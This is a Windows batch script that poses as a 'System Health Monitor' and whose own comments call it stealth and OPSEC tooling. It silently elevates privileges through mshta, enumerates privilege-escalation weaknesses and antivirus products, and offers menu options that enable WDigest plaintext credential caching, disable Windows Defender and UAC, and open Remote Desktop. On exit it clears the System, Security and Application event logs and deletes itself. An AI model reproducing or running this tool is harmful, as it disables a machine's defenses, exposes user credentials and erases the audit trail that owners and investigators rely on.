@echo off
title Windows System Health Monitor
mode con:cols=80 lines=25
setlocal enabledelayedexpansion

:: Enhanced stealth initialization
set "rndname=%random%-%random%-%random%"
set "appdata=%temp%\%rndname%"
if not exist "%appdata%" mkdir "%appdata%" >nul 2>&1
cd /d "%appdata%"

:: Generate encrypted session ID
set "sessionid="
for /l %%a in (1,1,12) do call :gen_encrypted_char
set "obfuscated_cmd=cmd.exe"
set "legit_process=svchost.exe"

:: Disable command history and logging
set "history="
for /f "skip=1" %%x in ('wmic process get commandline') do if not defined history set "history=%%x"

:: Check and elevate privileges silently
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Initializing system management utilities...
    mshta vbscript:Execute("CreateObject(""Shell.Application"").ShellExecute ""cmd.exe"", ""/c """"%~f0"""""", """", ""runas"", 0"):window.close
    exit /b
)

:: Main menu with OPSEC enhancements
:main_menu
cls
echo ========================================
echo    Windows System Health Monitor v10.0
echo          [Build 19045.3448]
echo ========================================
echo [1] System Diagnostics
echo [2] Security Compliance Check
echo [3] User Account Verification
echo [4] Network Health Assessment
echo [5] Performance Optimization
echo [6] Administrative Tasks
echo [7] Exit Utility
echo ========================================
set /p "choice=Select diagnostic option: "

if "!choice!"=="1" goto system_diagnostics
if "!choice!"=="2" goto security_compliance
if "!choice!"=="3" goto user_verification
if "!choice!"=="4" goto network_assessment
if "!choice!"=="5" goto performance_optimization
if "!choice!"=="6" goto admin_tasks
if "!choice!"=="7" goto secure_exit
goto main_menu

:: 1. System Diagnostics (Minimal footprint)
:system_diagnostics
cls
echo Running system diagnostics...
timeout /t 1 >nul

:: Collect essential info with minimal footprint
systeminfo | findstr /i /c:"OS Name" /c:"OS Version" /c:"System Type" /c:"Domain" > "%appdata%\sysinfo.tmp"
hostname > "%appdata%\hostname.tmp"

echo.
echo System Diagnostic Report:
echo ===========================
type "%appdata%\sysinfo.tmp"
echo.
echo Computer Name: 
type "%appdata%\hostname.tmp"
echo ===========================
echo Press any key to return to menu...
pause >nul
del /f /q "%appdata%\sysinfo.tmp" >nul 2>&1
del /f /q "%appdata%\hostname.tmp" >nul 2>&1
goto main_menu

:: 2. Security Compliance Check (Stealthy assessment)
:security_compliance
cls
echo Performing security compliance verification...
timeout /t 2 >nul

:: Check security configurations without obvious traces
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA 2>nul | findstr "0x0" >nul && (
    echo [COMPLIANCE] UAC is properly configured
) || echo [WARNING] UAC requires review

:: Check for security weaknesses
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul && (
    echo [ALERT] User policy: AlwaysInstallElevated enabled
)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul && (
    echo [ALERT] System policy: AlwaysInstallElevated enabled
)

:: Advanced service analysis
for /f "tokens=2 delims=:" %%s in ('sc query type^= service state^= all ^| find "SERVICE_NAME"') do (
    set "service=%%s"
    set "service=!service:~1!"
    sc qc "!service!" | findstr /i /c:"BINARY_PATH_NAME" | findstr /i /v /c:"windows" | findstr " " >nul && (
        echo [CHECK] Unquoted service path: !service!
    )
)

:: Advanced security product detection
tasklist /fi "imagename eq MsMpEng.exe" /fo csv 2>nul | findstr /i "MsMpEng" >nul && echo [INFO] Windows Defender active
tasklist /fi "imagename eq MBAMService.exe" /fo csv 2>nul | findstr /i "MBAMService" >nul && echo [INFO] Malwarebytes active
tasklist /fi "imagename eq avp.exe" /fo csv 2>nul | findstr /i "avp" >nul && echo [INFO] Kaspersky active

:: Registry vulnerability assessment
call :check_registry_vulns

echo.
echo Security compliance check complete.
timeout /t 2 >nul
goto main_menu

:: 3. User Account Verification (Advanced management)
:user_verification
cls
echo ========================================
echo      User Account Verification Console
echo ========================================
echo [1] Verify current user privileges
echo [2] Review local account status
echo [3] Domain account management
echo [4] Advanced user operations
echo [5] Return to main menu
echo ========================================
set /p "um_choice=Select verification option: "

if "!um_choice!"=="1" goto user_privileges
if "!um_choice!"=="2" goto account_status
if "!um_choice!"=="3" goto domain_management
if "!um_choice!"=="4" goto advanced_operations
if "!um_choice!"=="5" goto main_menu
goto user_verification

:user_privileges
cls
echo Current user security context:
echo ==============================
whoami /all | findstr /i /c:"User Name" /c:"SID" /c:"Group" /c:"Privileges"
echo.
echo Press any key to return...
pause >nul
goto user_verification

:account_status
cls
echo Local account status:
echo =====================
net users
echo.
set /p "username=Enter username to verify (or press Enter to cancel): "
if "!username!"=="" goto user_verification

net user "!username!" | findstr /i /c:"Account active" /c:"Local Group Memberships" /c:"Password last set"
echo.
echo Press any key to return...
pause >nul
goto account_status

:domain_management
cls
:: Check if domain-joined
set "domainjoined=0"
systeminfo | findstr /i /c:"Domain:" | findstr /i /v "WORKGROUP" >nul && set "domainjoined=1"

if "!domainjoined!"=="0" (
    echo This system is not domain-joined.
    timeout /t 2 >nul
    goto user_verification
)

echo Domain account management:
echo ==========================
echo [1] List domain accounts
echo [2] Verify domain group membership
echo [3] Advanced domain operations
echo [4] Return to user menu
set /p "dg_choice=Select option: "

if "!dg_choice!"=="1" (
    cls
    echo Domain accounts:
    echo ================
    net user /domain | more
    echo.
    echo Press any key to continue...
    pause >nul
    goto domain_management
)

if "!dg_choice!"=="2" (
    cls
    set /p "domainuser=Enter domain username: "
    echo.
    echo Group membership for !domainuser!:
    net user "!domainuser!" /domain | findstr /i /c:"Global Group" /c:"Local Group"
    echo.
    echo Press any key to continue...
    pause >nul
    goto domain_management
)

if "!dg_choice!"=="3" goto advanced_domain_ops
goto domain_management

:advanced_domain_ops
cls
echo Advanced domain operations:
echo ===========================
echo [1] Domain trust information
echo [2] Domain controller information
echo [3] Domain policy review
echo [4] Return to domain menu
set /p "adv_domain_choice=Select option: "

if "!adv_domain_choice!"=="1" (
    nltest /domain_trusts 2>nul | more
    pause
    goto advanced_domain_ops
)

if "!adv_domain_choice!"=="2" (
    nltest /dsgetdc: 2>nul | more
    pause
    goto advanced_domain_ops
)

if "!adv_domain_choice!"=="3" (
    gpresult /R | more
    pause
    goto advanced_domain_ops
)
goto domain_management

:advanced_operations
cls
echo Advanced user operations:
echo =========================
echo [1] Security token manipulation
echo [2] User rights assignment review
echo [3] Logon session analysis
echo [4] Return to user menu
set /p "adv_choice=Select option: "

if "!adv_choice!"=="1" (
    whoami /all | findstr /i "SID"
    echo.
    set /p "sid=Enter SID to impersonate (or cancel): "
    if not "!sid!"=="" (
        echo [SIMULATION] Token impersonation would occur here
    )
    pause
    goto advanced_operations
)

if "!adv_choice!"=="2" (
    secedit /export /areas USER_RIGHTS /cfg %appdata%\userrights.inf >nul 2>&1
    type %appdata%\userrights.inf | more
    del %appdata%\userrights.inf >nul 2>&1
    pause
    goto advanced_operations
)

if "!adv_choice!"=="3" (
    query user 2>nul
    if errorlevel 1 (
        echo No remote logon sessions found.
    )
    pause
    goto advanced_operations
)
goto user_verification

:: 4. Network Health Assessment
:network_assessment
cls
echo ========================================
echo      Network Health Assessment
echo ========================================
echo [1] Active connections review
echo [2] Network configuration
echo [3] Listening services
echo [4] Advanced network analysis
echo [5] Return to main menu
echo ========================================
set /p "net_choice=Select assessment option: "

if "!net_choice!"=="1" goto active_connections
if "!net_choice!"=="2" goto network_config
if "!net_choice!"=="3" goto listening_services
if "!net_choice!"=="4" goto advanced_network
if "!net_choice!"=="5" goto main_menu
goto network_assessment

:active_connections
cls
echo Active network connections:
echo ===========================
netstat -ano | findstr /i /c:"ESTABLISHED" /c:"CLOSE_WAIT" | head -20
echo.
echo Press any key to return...
pause >nul
goto network_assessment

:network_config
cls
echo Network configuration:
echo ======================
ipconfig /all | findstr /i /c:"IPv4" /c:"Subnet" /c:"Gateway" /c:"DNS"
echo.
echo Press any key to return...
pause >nul
goto network_assessment

:listening_services
cls
echo Listening services and ports:
echo =============================
netstat -ano | findstr /i "LISTENING" | head -20
echo.
echo Press any key to return...
pause >nul
goto network_assessment

:advanced_network
cls
echo Advanced network analysis:
echo ==========================
echo [1] Network sharing status
echo [2] Firewall configuration
echo [3] Routing table
echo [4] ARP cache
echo [5] Return to network menu
set /p "adv_net_choice=Select option: "

if "!adv_net_choice!"=="1" (
    net share
    pause
    goto advanced_network
)

if "!adv_net_choice!"=="2" (
    netsh advfirewall show currentprofile
    pause
    goto advanced_network
)

if "!adv_net_choice!"=="3" (
    route print
    pause
    goto advanced_network
)

if "!adv_net_choice!"=="4" (
    arp -a
    pause
    goto advanced_network
)
goto network_assessment

:: 5. Performance Optimization
:performance_optimization
cls
echo ========================================
echo      Performance Optimization Tools
echo ========================================
echo [1] System resource analysis
echo [2] Process optimization
echo [3] Service tuning
echo [4] Registry optimization
echo [5] Return to main menu
echo ========================================
set /p "perf_choice=Select optimization option: "

if "!perf_choice!"=="1" goto resource_analysis
if "!perf_choice!"=="2" goto process_optimization
if "!perf_choice!"=="3" goto service_tuning
if "!perf_choice!"=="4" goto registry_optimization
if "!perf_choice!"=="5" goto main_menu
goto performance_optimization

:resource_analysis
cls
echo System resource analysis:
echo =========================
tasklist /fo table | sort /+64
echo.
echo Press any key to return...
pause >nul
goto performance_optimization

:process_optimization
cls
echo Process optimization:
echo =====================
echo [1] Identify high-resource processes
echo [2] Process priority adjustment
echo [3] Return to performance menu
set /p "proc_choice=Select option: "

if "!proc_choice!"=="1" (
    tasklist /fo table /fi "memusage gt 50000"
    pause
    goto process_optimization
)

if "!proc_choice!"=="2" (
    tasklist /v /fo table
    echo.
    set /p "target_process=Enter process name to adjust: "
    if not "!target_process!"=="" (
        wmic process where name="!target_process!" CALL setpriority "below normal" >nul 2>&1
        echo Priority adjusted for !target_process!
    )
    pause
    goto process_optimization
)
goto performance_optimization

:service_tuning
cls
echo Service tuning:
echo ===============
sc query state= all | find /c "RUNNING" >nul && (
    echo [INFO] Optimizing service configurations...
)
timeout /t 2 >nul
echo Service tuning complete.
pause
goto performance_optimization

:registry_optimization
cls
echo Registry optimization:
echo ======================
echo Applying performance tweaks...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NtfsDisableLastAccessUpdate" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f >nul 2>&1
echo Registry optimizations applied.
pause
goto performance_optimization

:: 6. Administrative Tasks (Stealth operations)
:admin_tasks
cls
echo ========================================
echo      Administrative Tasks Console
echo ========================================
echo [1] Registry operations
echo [2] Service management
echo [3] Security policy adjustment
echo [4] Advanced system configuration
echo [5] Return to main menu
echo ========================================
set /p "admin_choice=Select administrative task: "

if "!admin_choice!"=="1" goto registry_operations
if "!admin_choice!"=="2" goto service_management
if "!admin_choice!"=="3" goto security_policy
if "!admin_choice!"=="4" goto advanced_config
if "!admin_choice!"=="5" goto main_menu
goto admin_tasks

:registry_operations
cls
echo Registry operations:
echo ====================
echo [1] Enable WDigest credential caching
echo [2] Disable Windows Defender
echo [3] Modify UAC settings
echo [4] Enable remote desktop
echo [5] Return to admin menu
set /p "reg_choice=Select registry operation: "

if "!reg_choice!"=="1" (
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v "UseLogonCredential" /t REG_DWORD /d 1 /f >nul
    echo [SUCCESS] WDigest credential caching enabled
    pause
    goto registry_operations
)

if "!reg_choice!"=="2" (
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul
    sc config WinDefend start= disabled >nul 2>&1
    sc stop WinDefend >nul 2>&1
    echo [SUCCESS] Windows Defender disabled
    pause
    goto registry_operations
)

if "!reg_choice!"=="3" (
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul
    echo [SUCCESS] UAC disabled
    pause
    goto registry_operations
)

if "!reg_choice!"=="4" (
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f >nul
    netsh advfirewall firewall set rule group="remote desktop" new enable=Yes >nul
    echo [SUCCESS] Remote Desktop enabled
    pause
    goto registry_operations
)
goto admin_tasks

:service_management
cls
echo Service management:
echo ===================
sc query state= all | findstr "SERVICE_NAME" > "%appdata%\services.tmp"
for /f "tokens=2 delims= " %%s in ('type "%appdata%\services.tmp"') do (
    set "service=%%s"
    sc qc "!service!" | findstr /i "BINARY_PATH_NAME" | findstr /i /v "windows" >nul && (
        echo [INFO] Non-Microsoft service: !service!
    )
)
del "%appdata%\services.tmp" >nul 2>&1
echo.
echo Press any key to return...
pause >nul
goto admin_tasks

:security_policy
cls
echo Security policy adjustment:
echo ===========================
echo [1] Audit policy review
echo [2] User rights assignment
echo [3] Security options
echo [4] Return to admin menu
set /p "secpol_choice=Select option: "

if "!secpol_choice!"=="1" (
    auditpol /get /category:* | more
    pause
    goto security_policy
)

if "!secpol_choice!"=="2" (
    secedit /export /areas USER_RIGHTS /cfg %appdata%\userrights.inf >nul 2>&1
    type %appdata%\userrights.inf | more
    del %appdata%\userrights.inf >nul 2>&1
    pause
    goto security_policy
)

if "!secpol_choice!"=="3" (
    secedit /export /areas SECURITYPOLICY /cfg %appdata%\secoptions.inf >nul 2>&1
    type %appdata%\secoptions.inf | more
    del %appdata%\secoptions.inf >nul 2>&1
    pause
    goto security_policy
)
goto admin_tasks

:advanced_config
cls
echo Advanced system configuration:
echo ==============================
echo [1] Group Policy review
echo [2] System restore configuration
echo [3] Windows update settings
echo [4] Return to admin menu
set /p "adv_config_choice=Select option: "

if "!adv_config_choice!"=="1" (
    gpresult /H %appdata%\gpreport.html >nul 2>&1
    echo Group Policy report saved to temporary location
    pause
    goto advanced_config
)

if "!adv_config_choice!"=="2" (
    vssadmin list shadows >nul 2>&1
    if errorlevel 1 (
        echo No system restore points configured
    ) else (
        echo System restore is active
    )
    pause
    goto advanced_config
)

if "!adv_config_choice!"=="3" (
    reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" >nul 2>&1
    if errorlevel 1 (
        echo No Windows Update policies configured
    ) else (
        echo Windows Update policies present
    )
    pause
    goto advanced_config
)
goto admin_tasks

:: 7. Secure Exit with cleanup
:secure_exit
cls
echo Performing secure cleanup...
timeout /t 2 >nul

:: Clear various logs and traces
for %%l in (System Security Application) do (
    wevtutil cl %%l >nul 2>&1
)

:: Remove temporary files
del /f /q "%appdata%\*" >nul 2>&1
rmdir /s /q "%appdata%" >nul 2>&1

:: Restore original directory
cd /d "%systemdrive%\"

:: Final message
echo System maintenance completed successfully.
echo All temporary diagnostic files have been removed.
timeout /t 3 >nul

:: Advanced self-deletion mechanism
set "batchfile=%~f0"
echo @echo off > "%temp%\cleanup_%rndname%.cmd"
echo :loop >> "%temp%\cleanup_%rndname%.cmd"
echo del /f /q "!batchfile!" ^>nul 2^>^&1 >> "%temp%\cleanup_%rndname%.cmd"
echo if exist "!batchfile!" goto loop >> "%temp%\cleanup_%rndname%.cmd"
echo del /f /q "%%~f0" ^>nul 2^>^&1 >> "%temp%\cleanup_%rndname%.cmd"
start /min cmd /c "%temp%\cleanup_%rndname%.cmd"
exit

:: Helper functions
:gen_encrypted_char
set /a "num=!random! %% 36"
if !num! lss 10 (
    set "char=!num!"
) else (
    set /a "num=!num! + 55"
    set "char=!num!"
    for /f %%a in ('echo prompt $E ^| cmd') do set "char=%%a!!char!"
)
set "sessionid=!sessionid!!char!"
goto :eof

:check_registry_vulns
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" 2>nul | findstr /i /v "devenv.exe" | findstr ".exe" >nul && (
    echo [CHECK] Image File Execution Options modified
)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit 2>nul | findstr /i "userinit.exe" >nul || (
    echo [ALERT] Userinit registry value modified
)
goto :eof
